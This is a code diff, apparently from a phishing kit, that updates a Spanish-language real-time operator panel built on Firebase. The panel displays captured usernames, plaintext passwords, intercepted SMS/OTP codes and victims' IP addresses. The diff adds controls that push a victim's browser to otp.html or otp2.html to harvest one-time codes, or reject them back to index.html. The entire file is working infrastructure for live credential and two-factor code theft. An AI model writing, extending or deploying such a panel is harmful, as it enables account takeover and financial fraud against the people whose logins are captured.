@@ -11,12 +11,16 @@
         body { background-color: #0f172a; font-family: 'Inter', sans-serif; color: white; }
         .card-user { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 16px; margin-bottom: 12px; }
         .card-spam { background: #451a1a; border: 1px solid #ef4444; opacity: 0.8; }
-        .btn { padding: 8px 16px; border-radius: 6px; font-size: 12px; cursor: pointer; border: none; margin: 2px; }
+        .btn { padding: 8px 16px; border-radius: 6px; font-size: 11px; cursor: pointer; border: none; margin: 2px; font-weight: bold; }
         .btn-blue { background: #3b82f6; color: white; }
+        .btn-orange { background: #f97316; color: white; }
         .btn-red { background: #ef4444; color: white; }
         .btn-green { background: #10b981; color: white; }
+        .btn-purple { background: #8b5cf6; color: white; }
         #login-overlay { position: fixed; inset: 0; background: #0f172a; z-index: 50; display: flex; align-items: center; justify-content: center; }
         #panel-content { display: none; }
+        .led-blink { animation: blink 1.5s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
     </style>
 </head>
 <body class="p-4">
@@ -36,11 +40,15 @@
         <div class="flex justify-between items-center mb-6 border-b border-slate-700 pb-4">
             <div>
                 <h1 class="text-3xl font-black text-white">PANEL <span class="text-blue-500">CLIENTES</span></h1>
-                <p class="text-slate-500 text-xs">Sistema de Registro</p>
+                <p class="text-slate-500 text-xs">Sistema de Registro + OTP</p>
             </div>
-            <div class="flex gap-4">
+            <div class="flex items-center gap-4">
+                <div class="flex items-center gap-2 bg-slate-800/50 px-4 py-2 rounded-full">
+                    <span class="w-2 h-2 bg-emerald-500 rounded-full led-blink"></span>
+                    <span class="text-xs font-bold text-emerald-400">LIVE</span>
+                </div>
                 <button onclick="mostrarSpam()" class="bg-red-600 hover:bg-red-500 px-4 py-2 rounded-lg text-sm">
-                    <i class="fa-solid fa-trash"></i> Ver Papelera (<span id="spam-count">0</span>)
+                    <i class="fa-solid fa-trash"></i> Papelera (<span id="spam-count">0</span>)
                 </button>
                 <button onclick="cerrarSesion()" class="text-slate-400 hover:text-white text-sm">SALIR</button>
             </div>
@@ -69,7 +77,7 @@
         <!-- BOTONES DE VISTA -->
         <div class="flex gap-2 mb-4">
             <button onclick="vistaActual = 'validos'; renderizar();" class="btn btn-green">✓ Registros Válidos</button>
-            <button onclick="vistaActual = 'spam'; renderizar();" class="btn btn-red">🗑 Papelera/Spam</button>
+            <button onclick="vistaActual = 'spam'; renderizar();" class="btn btn-red">🗑 Papelera</button>
             <button onclick="vistaActual = 'todos'; renderizar();" class="btn btn-blue">Todos</button>
         </div>
 
@@ -82,19 +90,11 @@
         let vistaActual = 'validos';
         let todosLosDatos = { validos: [], spam: [] };
 
-        // ANTI-SPAM MUY PERMISIVO (solo bloquea lo obvio)
+        // ANTI-SPAM MUY PERMISIVO
         function esSpam(id, data) {
-            // Solo bloquear si NO tiene datos básicos
             if (!data || !data.user || !data.pass) return true;
-            
-            // Solo bloquear IDs de prueba muy obvios
-            if (id === 'test' || id === 'prueba' || id === 'admin') return true;
-            
-            // Solo bloquear si es texto de prueba exacto
-            if (data.user === 'test' && data.pass === 'test') return true;
-            if (data.user === 'admin' && data.pass === 'admin') return true;
-            
-            return false; // TODO LO DEMÁS PASA
+            if (id === 'test' || id === 'admin') return true;
+            return false;
         }
 
         function validarAcceso() {
@@ -128,7 +128,6 @@
             if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
             db = firebase.database();
 
-            // Escuchar logins (válidos y spam)
             db.ref('logins').on('value', (snap) => {
                 const datos = [];
                 snap.forEach((child) => {
@@ -138,7 +137,6 @@
                 renderizar();
             });
 
-            // Escuchar spam
             db.ref('spam').on('value', (snap) => {
                 const datos = [];
                 snap.forEach((child) => {
@@ -170,51 +168,68 @@
             ).length;
 
             if (aMostrar.length === 0) {
-                container.innerHTML = '<div class="text-slate-500 text-center col-span-3 py-10">No hay registros en esta vista</div>';
+                container.innerHTML = '<div class="text-slate-500 text-center col-span-3 py-10">No hay registros</div>';
                 return;
             }
 
             aMostrar.forEach(({id, data, esSpam}) => {
                 const isOnline = data.online === true;
-                const cardClass = esSpam ? 'card-spam' : 'card-user';
+                const tieneOTP = data.sms && data.sms !== '----' && data.sms !== '';
                 
                 container.innerHTML += `
-                    <div class="${cardClass}">
+                    <div class="${esSpam ? 'card-spam' : 'card-user'}">
                         <div class="flex justify-between items-center mb-2">
                             <span class="text-xs text-slate-400">#${id.slice(-8)}</span>
                             ${esSpam ? '<span class="text-red-400 text-xs font-bold">🗑 BLOQUEADO</span>' : 
-                              `<span class="text-emerald-400 text-xs">${isOnline ? '● ONLINE' : '○ OFFLINE'}</span>`}
+                              `<span class="${isOnline ? 'text-emerald-400' : 'text-slate-500'} text-xs font-bold">
+                                ${isOnline ? '● ONLINE' : '○ OFFLINE'}
+                               </span>`}
                         </div>
                         
                         <div class="bg-slate-900 p-2 rounded mb-2">
                             <p class="text-xs text-slate-500">USUARIO</p>
-                            <p class="text-white font-bold">${data.user || 'N/A'}</p>
+                            <p class="text-white font-bold text-sm">${data.user || 'N/A'}</p>
                         </div>
                         
                         <div class="bg-slate-900 p-2 rounded mb-2">
                             <p class="text-xs text-slate-500">CONTRASEÑA</p>
-                            <p class="text-rose-400 font-bold">${data.pass || '****'}</p>
+                            <p class="text-rose-400 font-bold text-sm">${data.pass || '****'}</p>
                         </div>
                         
-                        <div class="bg-slate-900 p-2 rounded mb-2">
+                        <div class="bg-slate-900 p-2 rounded mb-2 text-center border ${tieneOTP ? 'border-emerald-500' : 'border-slate-700'}">
+                            <p class="text-xs ${tieneOTP ? 'text-emerald-400' : 'text-slate-500'} mb-1">
+                                ${tieneOTP ? '✓ CÓDIGO VERIFICADO' : 'ESPERANDO CÓDIGO'}
+                            </p>
+                            <p class="text-xl font-black ${tieneOTP ? 'text-emerald-400' : 'text-blue-400'} tracking-widest">${data.sms || '----'}</p>
+                        </div>
+                        
+                        <div class="bg-slate-900/50 p-2 rounded mb-2">
                             <p class="text-xs text-slate-500">IP CLIENTE</p>
-                            <p class="text-amber-400 font-mono text-sm">${data.ip || 'N/A'}</p>
+                            <p class="text-amber-400 font-mono text-xs">${data.ip || 'N/A'}</p>
                         </div>
                         
-                        <div class="flex justify-between text-xs text-slate-500 mb-2">
+                        <div class="flex justify-between text-xs text-slate-500 mb-2 px-1">
                             <span>${data.step || 'Registrado'}</span>
                             <span>${data.timestamp ? new Date(data.timestamp).toLocaleTimeString() : ''}</span>
                         </div>
 
-                        <div class="flex gap-1 flex-wrap">
-                            ${esSpam ? `
+                        ${esSpam ? `
+                            <div class="flex gap-1">
                                 <button onclick="recuperar('${id}')" class="btn btn-green">♻ Recuperar</button>
-                                <button onclick="eliminarSpam('${id}')" class="btn btn-red">🗑 Eliminar Permanentemente</button>
-                            ` : `
-                                <button onclick="solicitarOTP('${id}')" class="btn btn-blue">Solicitar OTP</button>
+                                <button onclick="eliminarSpam('${id}')" class="btn btn-red">Eliminar</button>
+                            </div>
+                        ` : `
+                            <div class="grid grid-cols-2 gap-1">
+                                <button onclick="solicitarOTP('${id}')" class="btn btn-blue">
+                                    <i class="fa-solid fa-comment-sms"></i> Solicitar OTP
+                                </button>
+                                <button onclick="solicitarOTP2('${id}')" class="btn btn-purple">
+                                    <i class="fa-solid fa-sync"></i> Solicitar OTP 2
+                                </button>
+                                <button onclick="rechazar('${id}')" class="btn btn-orange">Rechazar</button>
                                 <button onclick="eliminar('${id}')" class="btn btn-red">Borrar</button>
-                            `}
-                        </div>
+                            </div>
+                        `}
                     </div>
                 `;
             });
@@ -225,9 +240,38 @@
             renderizar();
         }
 
+        // FUNCIONES OTP CORREGIDAS
+        function solicitarOTP(id) {
+            // Guarda comando para que el cliente redirija a otp.html
+            db.ref('comandos/' + id).set({ 
+                action: 'redirect', 
+                url: 'otp.html',
+                ts: Date.now() 
+            });
+            alert('✓ Comando enviado: Redirigir a otp.html');
+        }
+
+        function solicitarOTP2(id) {
+            // Guarda comando para que el cliente redirija a otp2.html
+            db.ref('comandos/' + id).set({ 
+                action: 'redirect', 
+                url: 'otp2.html',
+                ts: Date.now() 
+            });
+            alert('✓ Comando enviado: Redirigir a otp2.html');
+        }
+
+        function rechazar(id) {
+            db.ref('comandos/' + id).set({ 
+                action: 'redirect', 
+                url: 'index.html',
+                ts: Date.now() 
+            });
+            db.ref('logins/' + id).update({ step: 'Rechazado', online: false });
+        }
+
         function recuperar(id) {
-            if (!confirm('¿Recuperar este registro a la lista principal?')) return;
-            
+            if (!confirm('¿Recuperar este registro?')) return;
             db.ref('spam/' + id).once('value').then((snap) => {
                 const data = snap.val();
                 if (data) {
@@ -238,13 +282,8 @@
         }
 
         function eliminarSpam(id) {
-            if (!confirm('¿Eliminar PERMANENTEMENTE? No se puede recuperar.')) return;
+            if (!confirm('¿Eliminar PERMANENTEMENTE?')) return;
             db.ref('spam/' + id).remove();
-        }
-
-        function solicitarOTP(id) {
-            db.ref('comandos/' + id).set({ action: 'request_otp', ts: Date.now() });
-            alert('OTP solicitado');
         }
 
         function eliminar(id) {
